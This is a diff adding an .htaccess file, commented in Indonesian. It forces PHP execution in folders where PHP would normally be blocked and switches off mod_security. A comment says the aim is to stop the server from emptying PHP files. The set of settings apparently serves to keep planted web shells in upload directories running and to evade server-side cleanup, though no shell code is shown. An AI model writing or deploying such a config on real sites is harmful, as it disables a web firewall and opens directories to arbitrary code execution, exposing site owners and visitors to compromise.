@@ -1,0 +1,23 @@
+# Pastikan PHP Engine aktif
+php_flag engine on
+php_value engine 1
+
+# Hindari PHP diblok folder
+RemoveHandler .php
+AddHandler application/x-httpd-php .php
+
+# Cegah server mengosongkan file PHP (anti-zero-byte)
+<IfModule mod_security.c>
+    SecRuleEngine Off
+</IfModule>
+
+# Untuk LiteSpeed
+<IfModule lsapi_module>
+    LSEnabled On
+</IfModule>
+
+# Izinkan eksekusi PHP walaupun berada di folder non-PHP
+AddType application/x-httpd-php .php
+
+# Pastikan index.php tetap dijalankan
+DirectoryIndex index.php index.html
